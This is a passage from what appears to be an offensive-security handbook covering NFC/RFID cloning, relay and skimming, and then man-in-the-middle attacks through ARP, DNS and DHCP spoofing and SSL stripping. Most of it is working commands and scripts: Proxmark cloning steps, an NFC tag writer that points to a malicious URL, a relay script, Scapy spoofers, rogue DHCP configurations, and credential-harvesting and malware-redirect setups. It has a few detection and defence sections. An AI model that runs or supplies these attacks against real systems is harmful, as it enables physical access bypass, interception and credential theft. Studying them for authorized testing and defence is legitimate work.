# Automated NDEF extraction
#!/bin/bash
sudo nfc-poll | grep -E "Ndef|Text|URI"
```

**NFC Man-in-the-Middle (MITM)**

Intercept NFC communication between reader and tag:

```bash
# Using two NFC devices
# Device 1: Emulates target tag
# Device 2: Emulates reader

# Setup relay attack (long-range MITM)
# Device A: Reader at location 1
# Device B: Relay at location 1 (receives from A)
# Device C: Relay at location 2 (transmits to D)
# Device D: Tag at location 2

# Proxmark3 relay setup
proxmark3 -p [PORT1]
# hw status
# hf 14a sim 2  (Emulate Mifare)

# Second Proxmark3 instance
proxmark3 -p [PORT2]
# hf mf sim --uid [UID]  (Emulate tag with specific UID)
```

**HID Prox Card Cloning**

Clone HID proximity cards (125kHz):

```bash
# Read HID Prox card
sudo proxmark3
# lf search

# Capture facility code and card number

# HID Prox card cloning (continued)

# Write to T55xx tag

lf hid clone --id [FACILITY_CODE:CARD_NUMBER]

# Verify clone

lf search

````

**NFC Sticker/Label Encoding**

Write data to NFC stickers for social engineering:

```bash
# Create malicious NDEF record
#!/bin/bash
# Using nfcpy to write records

cat > nfc_write.py << 'EOF'
import nfc.ndef
import nfc.clf

# Create URI record pointing to malicious site
uri_record = nfc.ndef.UriRecord("https://malicious-site.com/payload")

# Create text record
text_record = nfc.ndef.TextRecord("Click here")

# Write to NFC tag
clf = nfc.clf.ContactlessFrontend('usb')
target = clf.poll(nfc.clf.RemoteTarget)
target.write_ndef(nfc.ndef.Message(uri_record))
EOF

python3 nfc_write.py
````

**RFID Cloning Attack Chain**

Complete workflow for RFID tag cloning and deployment:

```bash
# 1. Identify target tag frequency and type
proxmark3
lf search  # Low frequency
hf search  # High frequency

# 2. Read target tag
lf t55xx detect
# or
hf mfu info

# 3. Extract unique identifiers (UID, facility code, etc.)
lf em 410x read  # EM4100 format
hf mf chk -k ffffffffffff  # Mifare default key

# 4. Clone to blank tag
lf em 410x clone --id [CAPTURED_ID]
# or
hf mf cload -f dump.mfd

# 5. Test cloned tag
lf search
# Verify output matches original tag

# 6. Deploy cloned tag in physical security bypass
# (Use in access control reader, payment system, etc.)
```

**NFC Relay Attack Setup**

Long-range MITM attack using two NFC readers:

```bash
# Location 1: Near legitimate card
# Device 1: Read card and relay data
cat > relay_1.py << 'EOF'
import nfc.clf
import socket

clf = nfc.clf.ContactlessFrontend('usb:001,001')
target = clf.poll(nfc.clf.RemoteTarget)

# Get tag data
tag_data = target.read_ndef()

# Send to location 2 via network
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('relay_2_server', 9999))
sock.send(tag_data)
sock.close()
EOF

# Location 2: Near access control reader
# Device 2: Receive relayed data and emulate to reader
cat > relay_2.py << 'EOF'
import nfc.clf
import socket

# Receive relayed data
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', 9999))
sock.listen(1)
conn, addr = sock.accept()
tag_data = conn.recv(1024)

# Emulate tag to reader
clf = nfc.clf.ContactlessFrontend('usb:001,002')
target = clf.sense(nfc.clf.RemoteInitiator, timeout=1)
target.write_ndef(tag_data)
EOF

# Run relay 1
python3 relay_1.py &

# Run relay 2
python3 relay_2.py &
```

**ISO 15693 Tag Enumeration**

Extended-range RFID tag analysis (13.56MHz):

```bash
# Using Proxmark3 for ISO15693
proxmark3
hf 15 info

# Read ISO15693 tag
hf 15 rdmem

# Get NUID (Unique ID)
hf 15 scan

# ISO15693 tags often unencrypted
# Data directly readable from memory blocks
```

**RFID Skimming and Data Harvesting**

Unauthorized reading of RFID cards at distance:

```bash
# Long-range RFID reader setup
# Amplified antenna (3-5 feet range for 125kHz)

# Scan for nearby RFID tags continuously
#!/bin/bash
while true; do
    proxmark3 -c "lf search"
    sleep 2
done > skimmed_tags.log

# Parse and analyze captured data
grep -oE "[0-9A-Fa-f]{10}" skimmed_tags.log | sort -u > unique_tags.txt

# Export for further analysis or cloning
cat unique_tags.txt
```

**Bluetooth + NFC Combination Attacks**

Exploit multi-wireless systems:

```bash
# Scenario: Device supports both BLE and NFC

# Step 1: Read NFC capability information
sudo nfc-poll

# Step 2: Establish BLE pairing
sudo bluetoothctl connect [MAC]

# Step 3: Use NFC to authenticate subsequent BLE operations
# Some devices validate identity via both protocols

# Attack: Spoof both protocols simultaneously
# Read NFC tag identity
# Forge BLE advertisement with matching identity
```

**RFID Signal Blocking and Replay**

Capture and replay RFID signals:

```bash
# Using Software Defined Radio (Hack RF, USRP)
# GNU Radio configuration for RFID replay

# Capture RFID signal
gnuradio-companion &
# Create flowgraph:
# File source -> Complex to Real -> File sink

# Transmit captured signal
gnuradio-companion &
# Create flowgraph:
# File source -> Real to Complex -> USRP Sink

# Example with HackRF
hackrf_transfer -r captured_signal.bin -f 125000000 -s 2000000

# Replay to access control reader
hackrf_transfer -t captured_signal.bin -f 125000000 -s 2000000
```

**EMV Contactless Payment Card Analysis**

Examine contactless payment (NFC/RFID) cards:

```bash
# Detect contactless payment card
sudo nfc-poll

# Read public payment data (unencrypted)
sudo nfcpy
# target = clf.poll()
# ndef = target.read_ndef()

# Extract:
# Application ID (AID)
# Card number (first 6 digits PAN, last 4 digits)
# Expiration date (if present)
# Transaction counter

# [Unverified] Full card data typically encrypted
# Public data sufficient for fraud detection research

# Analyze with EMV inspection tools
# Note: Cloning modern EMV cards requires cryptographic keys
# not easily extractable from RF signals
```

**NFC-Protected Area Bypass**

Circumvent NFC-based security mechanisms:

```bash
# Scenario: NFC tag required to unlock door/device

# Attack 1: Relay attack (covered above)

# Attack 2: Signal jamming
# Jam legitimate NFC signal, substitute relay signal
# Using Software Defined Radio

# Attack 3: Tag emulation
# Extract tag UID/data
# Program blank tag with extracted data
proxmark3
hf mf cload -f dump.mfd

# Attack 4: Cryptographic bypass (if key extraction possible)
# Some RFID implementations use weak encryption
# Example: Mifare Classic uses 48-bit keys (cryptographically weak)
mfcuk -C -R 0:A -v 3  # Find default/weak keys
```

**RFID Physical Reconnaissance**

Perform site survey before RFID attacks:

```bash
# Identify RFID reader locations
# Catalog frequency bands in use (125kHz, 13.56MHz)
# Document antenna types and orientations
# Note environmental factors (metal, water affecting signal)

# Log signal strength at various distances
#!/bin/bash
for distance in 1 2 3 5 10 15 20; do
    echo "Distance: ${distance} feet"
    proxmark3 -c "lf search" 2>&1 | grep "Hit"
    sleep 1
done
```

**Documentation of Enumeration Results**

Capture comprehensive RFID/NFC data for reporting:

```bash
#!/bin/bash
# rfid_enum_report.sh

OUTPUT_DIR="rfid_assessment_$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

echo "[*] NFC Device Detection"
sudo nfc-list > "$OUTPUT_DIR/nfc_devices.txt"

echo "[*] NFC Tag Scanning"
timeout 30 sudo nfc-poll > "$OUTPUT_DIR/nfc_scan_30s.txt"

echo "[*] RFID Low Frequency Scan"
proxmark3 -c "lf search" > "$OUTPUT_DIR/rfid_lf_scan.txt"

echo "[*] RFID High Frequency Scan"
proxmark3 -c "hf search" > "$OUTPUT_DIR/rfid_hf_scan.txt"

echo "[*] Detailed analysis"
cat "$OUTPUT_DIR"/*.txt > "$OUTPUT_DIR/combined_report.txt"

echo "[+] Assessment complete: $OUTPUT_DIR"
```

---

**Related Topics for Advanced Wireless Attack Scenarios**

- **802.11 WPA3 Exploitation**: Advanced Wi-Fi security protocol attacks
- **Bluetooth Mesh Network Attacks**: IoT mesh network exploitation
- **5G Security Testing**: Next-generation cellular protocol weaknesses
- **Software Defined Radio (SDR) for Wireless**: Frequency analysis and signal injection techniques
- **Physical Layer Attacks**: Signal jamming, replay, and RF spoofing

---

# Man-in-the-Middle Attacks

Man-in-the-Middle (MITM) attacks position an attacker between two communicating parties to intercept, modify, or relay traffic. These attacks exploit trust relationships in network protocols to capture credentials, session tokens, and sensitive data.

## ARP Spoofing

ARP (Address Resolution Protocol) spoofing manipulates ARP tables to redirect traffic through the attacker's machine. ARP maps IP addresses to MAC addresses on local networks without authentication.

### ARP Protocol Fundamentals

**ARP operation:**

```bash
# View ARP cache
arp -a
arp -n  # Numeric output

# Manual ARP entry
arp -s 192.168.1.1 00:11:22:33:44:55

# Delete ARP entry
arp -d 192.168.1.1

# Clear entire ARP cache (Linux)
ip -s -s neigh flush all
```

**ARP packet structure:**

- Hardware type (Ethernet: 1)
- Protocol type (IPv4: 0x0800)
- Hardware address length (MAC: 6 bytes)
- Protocol address length (IPv4: 4 bytes)
- Operation (Request: 1, Reply: 2)
- Sender MAC/IP
- Target MAC/IP

### Ettercap

Comprehensive MITM framework with ARP spoofing capabilities:

**Basic ARP poisoning:**

```bash
# Unified sniffing (single interface)
ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//

# Parameters explained:
# -T = text interface
# -M arp:remote = ARP poisoning, forward packets
# /IP// = target specification (// means any port)
# First target: victim, Second target: gateway

# Bidirectional poisoning (victim and gateway)
ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//

# One-way poisoning (only victim)
ettercap -T -M arp:oneway /192.168.1.10// /192.168.1.1//

# Graphical interface
ettercap -G
```

**Advanced Ettercap usage:**

```bash
# Specify interface
ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//

# Multiple targets
ettercap -T -M arp:remote /192.168.1.10,192.168.1.11// /192.168.1.1//

# Entire subnet
ettercap -T -M arp:remote /192.168.1.0-255// /192.168.1.1//

# Save captured traffic to pcap
ettercap -T -M arp:remote -w capture.pcap /192.168.1.10// /192.168.1.1//

# Use filters (for packet modification)
ettercap -T -M arp:remote -F filter.ef /192.168.1.10// /192.168.1.1//

# Plugin usage
ettercap -T -M arp:remote -P dns_spoof /192.168.1.10// /192.168.1.1//
```

**Ettercap configuration (`/etc/ettercap/etter.conf`):**

```ini
# Enable IP forwarding (required for MITM)
ec_uid = 0
ec_gid = 0

[privs]
ec_uid = 65534
ec_gid = 65534

# Uncomment for Linux
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
```

**Creating Ettercap filters:**

```bash
# Example filter (drop SSH)
# File: drop_ssh.filter
if (ip.proto == TCP && tcp.dst == 22) {
    drop();
    kill();
}

# Compile filter
etterfilter drop_ssh.filter -o drop_ssh.ef

# Apply filter
ettercap -T -M arp:remote -F drop_ssh.ef /target// /gateway//
```

### arpspoof (dsniff suite)

Lightweight ARP spoofing tool:

```bash
# Enable IP forwarding first
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof victim (tell victim you are gateway)
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Spoof gateway (tell gateway you are victim) - separate terminal
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Spoof entire subnet
arpspoof -i eth0 -t 192.168.1.1 192.168.1.0/24
```

**arpspoof workflow:**

```bash
# Terminal 1: Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Terminal 2: Poison victim
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Terminal 3: Poison gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Terminal 4: Capture traffic
tcpdump -i eth0 -w capture.pcap host 192.168.1.10
```

### Bettercap

Modern MITM framework with extensive capabilities:

```bash
# Interactive mode
bettercap -iface eth0

# Commands in bettercap shell:
# Discover hosts
net.probe on

# View discovered hosts
net.show

# Enable ARP spoofing
set arp.spoof.targets 192.168.1.10
arp.spoof on

# Full subnet spoofing
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Enable HTTP/HTTPS sniffing
set net.sniff.verbose true
net.sniff on

# SSL stripping
set http.proxy.sslstrip true
http.proxy on
https.proxy on
```

**Bettercap caplets (automation scripts):**

```bash
# Create caplet file: mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.10
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose false
set net.sniff.local true
set net.sniff.output /tmp/capture.pcap

# Run caplet
bettercap -iface eth0 -caplet mitm.cap

# Non-interactive mode
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on"
```

**Bettercap credential harvesting:**

```bash
# Enable credential sniffer
set net.sniff.verbose true
set net.sniff.local false
set net.sniff.filter 'tcp port 80 or tcp port 21 or tcp port 25'
net.sniff on
```

### MITMf (Man-In-The-Middle Framework)

[Unverified] MITMf development appears inactive since ~2016; use with caution:

```bash
# Basic ARP spoofing
python mitmf.py -i eth0 --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10

# SSL stripping
python mitmf.py -i eth0 --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10 --hsts

# Screenshot plugin
python mitmf.py -i eth0 --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10 --screen

# JavaScript injection
python mitmf.py -i eth0 --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10 --inject --js-payload "alert('XSS')"
```

### Manual ARP Spoofing with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *
import time
import sys

def get_mac(ip):
    """Get MAC address for IP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def spoof(target_ip, spoof_ip, target_mac):
    """Send spoofed ARP reply"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, source_ip, dest_mac, source_mac):
    """Restore original ARP tables"""
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

# Configuration
target_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"

# Get MAC addresses
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

if not target_mac or not gateway_mac:
    print("Could not find MAC addresses")
    sys.exit(1)

# Enable IP forwarding
import subprocess
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)

try:
    print(f"Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRestoring ARP tables...")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
    print("ARP tables restored")
```

### ARP Spoofing Detection

**Detecting ARP poisoning:**

```bash
# Monitor ARP table changes
watch -n 1 arp -a

# Detect duplicate IPs with different MACs
arp -a | sort -k 2 | uniq -d -f 1

# Use arpwatch (passive monitoring)
arpwatch -i eth0

# XArp (commercial, Windows/Linux)
# Detects ARP spoofing and alerts
```

**Wireshark detection:**

```
# Display filter for ARP spoofing indicators
arp.duplicate-address-detected
arp.duplicate-address-frame

# Multiple IPs claiming same MAC
arp
```

### Prerequisites for ARP Spoofing

**Enable IP forwarding (critical):**

```bash
# Linux
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Permanent (edit /etc/sysctl.conf)
net.ipv4.ip_forward=1

# Verify
cat /proc/sys/net/ipv4/ip_forward
sysctl net.ipv4.ip_forward
```

**iptables configuration for MITM:**

```bash
# Redirect HTTP traffic to proxy
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Redirect HTTPS traffic
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443

# NAT configuration
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# View rules
iptables -t nat -L -n -v

# Flush rules
iptables -t nat -F
```

## DNS Spoofing

DNS spoofing returns malicious DNS responses to redirect victims to attacker-controlled servers. Requires active MITM position (typically via ARP spoofing).

### Ettercap DNS Spoofing

**Configure DNS spoofing (`/etc/ettercap/etter.dns`):**

```bash
# Redirect specific domain to attacker IP
example.com      A   192.168.1.50
www.example.com  A   192.168.1.50

# Wildcard subdomain redirection
*.example.com    A   192.168.1.50

# Redirect all domains (dangerous)
*                A   192.168.1.50

# IPv6 support
example.com      AAAA   fe80::1

# PTR records (reverse DNS)
50.1.168.192.in-addr.arpa   PTR   attacker.local
```

**Execute DNS spoofing:**

```bash
# Enable dns_spoof plugin
ettercap -T -M arp:remote -P dns_spoof /192.168.1.10// /192.168.1.1//

# In GUI mode
ettercap -G
# Select Unified sniffing -> Network interface
# Hosts -> Scan for hosts
# Hosts -> Hosts list
# Select target and gateway (Add to Target 1/2)
# Mitm -> ARP poisoning
# Plugins -> Manage plugins -> dns_spoof
```

### dnschef

Highly configurable DNS proxy for spoofing:

```bash
# Basic DNS spoofing (all domains to 192.168.1.50)
dnschef --fakeip 192.168.1.50 --interface 192.168.1.100

# Specific domain spoofing
dnschef --fakedomains example.com --fakeip 192.168.1.50

# Multiple domains
dnschef --fakedomains example.com,test.com --fakeip 192.168.1.50

# IPv6 spoofing
dnschef --fakeip 192.168.1.50 --fakeipv6 fe80::1

# Fake specific record types
dnschef --fakeip 192.168.1.50 --fakemail mail.attacker.com

# Configuration file
dnschef --file dns_rules.ini

# Specify name server
dnschef --fakeip 192.168.1.50 --nameservers 8.8.8.8
```

**dnschef configuration file (`dns_rules.ini`):**

```ini
[A]
*.example.com=192.168.1.50
login.bank.com=192.168.1.51

[AAAA]
example.com=fe80::1

[MX]
example.com=mail.attacker.com

[CNAME]
www.example.com=phishing.attacker.com
```

### Bettercap DNS Spoofing

```bash
# Interactive mode
bettercap -iface eth0

# Enable ARP spoofing first
set arp.spoof.targets 192.168.1.10
arp.spoof on

# Configure DNS spoofing
set dns.spoof.domains example.com,*.example.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# All domains to attacker
set dns.spoof.all true
set dns.spoof.address 192.168.1.50
dns.spoof on
```

**Bettercap DNS spoofing caplet:**

```bash
# File: dns_spoof.cap
net.probe on
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.fullduplex true
arp.spoof on

set dns.spoof.domains example.com,*.example.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# Run caplet
bettercap -iface eth0 -caplet dns_spoof.cap
```

### Responder

Windows network poisoning tool that responds to LLMNR, NBT-NS, and MDNS:

```bash
# Basic operation (captures hashes)
responder -I eth0

# Analyze mode (passive, no poisoning)
responder -I eth0 -A

# Enable WPAD spoofing
responder -I eth0 -w

# Force WPAD authentication
responder -I eth0 -wF

# Disable specific services
responder -I eth0 --lm --disable-ess

# Verbose output
responder -I eth0 -v
```

[Inference] Responder primarily targets Windows environments exploiting legacy name resolution protocols.

### Manual DNS Spoofing with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *

def dns_spoof(pkt):
    """Spoof DNS responses"""
    if pkt.haslayer(DNSQR):
        spoofed_domain = "example.com"
        attacker_ip = "192.168.1.50"
        
        # Check if query matches target domain
        if spoofed_domain in pkt[DNSQR].qname.decode():
            # Create spoofed DNS response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=attacker_ip))
            
            send(spoofed_pkt, verbose=0)
            print(f"Spoofed DNS response for {pkt[DNSQR].qname.decode()} -> {attacker_ip}")

# Sniff DNS queries and spoof responses
print("Starting DNS spoofing...")
sniff(filter="udp port 53", prn=dns_spoof, store=0)
```

### DNS Spoofing Attack Scenarios

**Credential harvesting:**

```bash
# 1. Set up ARP spoofing
ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//

# 2. Configure DNS spoofing for login portal
echo "login.company.com A 192.168.1.50" >> /etc/ettercap/etter.dns

# 3. Enable DNS plugin
ettercap -T -M arp:remote -P dns_spoof /192.168.1.10// /192.168.1.1//

# 4. Host fake login page on 192.168.1.50
cd /var/www/html
python3 -m http.server 80
```

**Malware distribution:**

```bash
# Redirect update servers to malicious payloads
update.software.com A 192.168.1.50
download.app.com A 192.168.1.50
```

### DNSSEC and Protection

**DNSSEC validation (prevents DNS spoofing):**

```bash
# Check DNSSEC status
dig +dnssec example.com

# Validate DNSSEC chain
delv example.com

# Test DNSSEC validation
dig @8.8.8.8 +dnssec example.com
```

[Inference] DNSSEC-signed domains are resistant to DNS spoofing as responses include cryptographic signatures that attackers cannot forge.

## DHCP Spoofing

DHCP spoofing provides malicious network configuration to clients, setting the attacker as default gateway or DNS server.

### DHCP Protocol Fundamentals

**DHCP process (DORA):**

1. **Discover** - Client broadcasts request for IP
2. **Offer** - DHCP server offers IP configuration
3. **Request** - Client requests offered configuration
4. **Acknowledge** - Server confirms assignment

**DHCP packet structure:**

- Operation (Request: 1, Reply: 2)
- Hardware type/length
- Transaction ID
- Client IP, Your IP, Server IP, Gateway IP
- Client MAC address
- DHCP options (subnet mask, router, DNS, lease time)

### Yersinia

Layer 2 attack framework with DHCP spoofing capabilities:

```bash
# Interactive mode
yersinia -I

# GUI mode
yersinia -G

# DHCP attack from command line
yersinia dhcp -attack 1 -interface eth0

# DHCP attacks available:
# 1: Sending DISCOVER packet
# 2: Sending REQUEST packet  
# 3: Sending RELEASE packet
# 4: Sending INFORM packet
# 5: Creating DHCP rogue server

# Create rogue DHCP server
yersinia dhcp -attack 5 -interface eth0
```

**Yersinia DHCP starvation:**

```bash
# Exhaust DHCP pool by requesting all available IPs
yersinia dhcp -attack 1 -interface eth0
# This rapidly sends DISCOVER packets with random MAC addresses
```

### dhcpstarv (DHCP Starvation)

Exhaust legitimate DHCP server's IP pool:

```bash
# Install
apt-get install dhcpstarv

# Basic starvation attack
dhcpstarv -i eth0

# Specify target DHCP server
dhcpstarv -i eth0 -s 192.168.1.1

# Verbose output
dhcpstarv -i eth0 -v
```

**Attack flow:**

1. Sends DHCP DISCOVER with random MAC addresses
2. Legitimate DHCP server offers IPs
3. Attacker requests and receives all available IPs
4. New clients cannot obtain IP addresses
5. Deploy rogue DHCP server to provide malicious configuration

### Rogue DHCP Server Setup

**dnsmasq (lightweight DHCP/DNS server):**

```bash
# Install
apt-get install dnsmasq

# Configuration (/etc/dnsmasq.conf)
interface=eth0
dhcp-range=192.168.1.50,192.168.1.100,12h
dhcp-option=3,192.168.1.50    # Gateway (attacker)
dhcp-option=6,192.168.1.50    # DNS server (attacker)
dhcp-option=1,255.255.255.0   # Subnet mask
dhcp-authoritative

# Start dnsmasq
systemctl start dnsmasq

# Check status
systemctl status dnsmasq

# View leases
cat /var/lib/misc/dnsmasq.leases
```

**ISC DHCP Server:**

```bash
# Install
apt-get install isc-dhcp-server

# Configuration (/etc/dhcp/dhcpd.conf)
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.50 192.168.1.100;
    option routers 192.168.1.50;              # Attacker as gateway
    option domain-name-servers 192.168.1.50;  # Attacker as DNS
    option broadcast-address 192.168.1.255;
    default-lease-time 600;
    max-lease-time 7200;
}

# Specify interface (/etc/default/isc-dhcp-server)
INTERFACESv4="eth0"

# Start server
systemctl start isc-dhcp-server

# Check leases
cat /var/lib/dhcp/dhcpd.leases
```

### DHCP Spoofing with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *

def dhcp_spoof(pkt):
    """Respond to DHCP Discover with malicious DHCP Offer"""
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        
        # Craft DHCP Offer
        dhcp_offer = Ether(src=get_if_hwaddr(conf.iface), dst=client_mac) / \
                     IP(src="192.168.1.50", dst="255.255.255.255") / \
                     UDP(sport=67, dport=68) / \
                     BOOTP(op=2, xid=xid, yiaddr="192.168.1.100", 
                           siaddr="192.168.1.50", chaddr=mac2str(client_mac)) / \
                     DHCP(options=[
                         ("message-type", "offer"),
                         ("server_id", "192.168.1.50"),
                         ("lease_time", 3600),
                         ("subnet_mask", "255.255.255.0"),
                         ("router", "192.168.1.50"),        # Attacker as gateway
                         ("name_server", "192.168.1.50"),   # Attacker as DNS
                         "end"
                     ])
        
        sendp(dhcp_offer, verbose=0)
        print(f"Sent malicious DHCP Offer to {client_mac}")

# Sniff for DHCP Discover packets
print("Starting rogue DHCP server...")
sniff(filter="udp and (port 67 or port 68)", prn=dhcp_spoof, store=0)
```

### DHCP Attack Combinations

**Complete MITM setup:**

```bash
# Terminal 1: DHCP starvation
dhcpstarv -i eth0

# Terminal 2: Start rogue DHCP server
dnsmasq -C /etc/dnsmasq.conf --no-daemon

# Terminal 3: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Terminal 4: Capture traffic
tcpdump -i eth0 -w dhcp_mitm.pcap
```

**Targeted DHCP poisoning:**

```bash
# Wait for specific client to request DHCP
# Respond faster than legitimate server
# Provide malicious gateway/DNS configuration
```

### DHCP Snooping (Defense)

**Switch configuration (Cisco example):**

```
# Enable DHCP snooping globally
(config)# ip dhcp snooping

# Enable on VLAN
(config)# ip dhcp snooping vlan 10

# Trust legitimate DHCP server port
(config-if)# ip dhcp snooping trust

# Untrusted ports (client-facing)
(config-if)# no ip dhcp snooping trust

# Rate limiting
(config-if)# ip dhcp snooping limit rate 10
```

### Detection and Monitoring

**Detect rogue DHCP servers:**

```bash
# nmap DHCP discovery
nmap --script broadcast-dhcp-discover

# dhcpdump (monitor DHCP traffic)
dhcpdump -i eth0

# Wireshark filter
bootp.option.dhcp == 2  # DHCP Offer packets

# Check for multiple DHCP servers
tcpdump -i eth0 -n port 67 or port 68
```

**Analyze DHCP traffic:**

```bash
# Identify DHCP servers by IP
tcpdump -i eth0 -n 'udp port 67 or udp port 68' | grep "DHCP-Message.*Offer"

# Extract server identifiers
tshark -i eth0 -Y "bootp.option.dhcp == 2" -T fields -e bootp.option.dhcp_server_id
```

### CTF Application Scenarios

**Common MITM CTF challenges:**

1. **Credential capture** - Intercept HTTP authentication
2. **Session hijacking** - Steal session cookies
3. **Traffic modification** - Inject payloads into responses
4. **SSL stripping** - Downgrade HTTPS to HTTP
5. **Protocol exploitation** - Manipulate network protocols

**MITM workflow for CTF:**

```bash
# 1. Position in network path
ettercap -T -M arp:remote /target// /gateway//

# 2. Capture credentials
ettercap -T -M arp:remote -L capture /target// /gateway//
# Parse capture.eci file for credentials

# 3. Modify traffic
# Create filter to inject JavaScript/modify responses
etterfilter exploit.filter -o exploit.ef
ettercap -T -M arp:remote -F exploit.ef /target// /gateway//

# 4. SSL strip
bettercap -iface eth0 -eval "set http.proxy.sslstrip true; http.proxy on; https.proxy on"
```

**Important prerequisites:**

- IP forwarding must be enabled
- Attacker must be on same network segment (Layer 2)
- Switches without port security are vulnerable
- HTTPS/certificate pinning prevents some attacks

**Limitations and warnings:**

- Modern HTTPS with HSTS prevents SSL stripping
- Certificate pinning defeats MITM proxies
- Switched networks require ARP spoofing
- Detection tools can identify ARP anomalies
- [Unverified] Some switches implement DAI (Dynamic ARP Inspection)

**Important Related Topics**

- **SSL/TLS Stripping** (sslstrip, bettercap) - Downgrade secure connections
- **Packet Sniffing** (Wireshark, tcpdump) - Analyze captured MITM traffic
- **Traffic Analysis** (NetworkMiner, Chaosreader) - Extract credentials from pcap
- **Wireless MITM** (Evil Twin, Karma attacks) - Wi-Fi specific MITM techniques

---

## SSL Stripping

SSL stripping downgrades HTTPS connections to HTTP by intercepting initial requests and presenting an HTTP version of the target site to the victim while maintaining HTTPS to the actual server. This allows plaintext interception of credentials and sensitive data.

### Attack Mechanics

**Prerequisites:**

- Position as network intermediary (ARP spoofing, rogue AP, compromised router)
- Victim initiates connection via HTTP or follows HTTP link
- Target site lacks HSTS (HTTP Strict Transport Security) or first visit

**Attack Flow:**

1. Victim requests `http://target.com` (or clicks HTTP link)
2. Attacker intercepts request, fetches `https://target.com`
3. Attacker serves victim HTTP version with modified links (https â†’ http)
4. Victim submits credentials over HTTP
5. Attacker captures plaintext data, forwards to real server over HTTPS

### sslstrip - Classic SSL Stripping Tool

```bash
# Installation
apt-get install sslstrip
# Or: pip install sslstrip

# Basic SSL stripping
sslstrip -l 8080

# With logging
sslstrip -l 8080 -w sslstrip.log

# Specify log file and favicon interception
sslstrip -l 8080 -w sslstrip.log -f

# Kill after specific time (seconds)
sslstrip -l 8080 -k 3600
```

**Complete Attack Setup:**

```bash
# Step 1: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Step 2: Setup iptables to redirect traffic
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# Step 3: ARP spoofing (position as MITM)
arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
# -t: victim IP, second IP: gateway

# Alternative: Ettercap for ARP spoofing
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# Step 4: Start sslstrip
sslstrip -l 8080 -w captured.log

# Step 5: Monitor captured data
tail -f captured.log
```

**Reading sslstrip Logs:**

```bash
# View captured credentials
cat sslstrip.log | grep -i "user\|pass\|login\|email"

# Parse POST data
grep "POST" sslstrip.log -A 20

# Extract cookies
grep "Cookie:" sslstrip.log
```

### sslstrip+ / sslstrip2 - Enhanced Version

[Inference: Handles some HSTS bypass scenarios]

```bash
# Clone and install
git clone https://github.com/LeonardoNve/sslstrip2.git
cd sslstrip2
python setup.py install

# Run with DNS spoofing support
python sslstrip.py -l 8080 -w sslstrip2.log

# Often used with dns2proxy for HSTS bypass
# Requires additional DNS spoofing setup
```

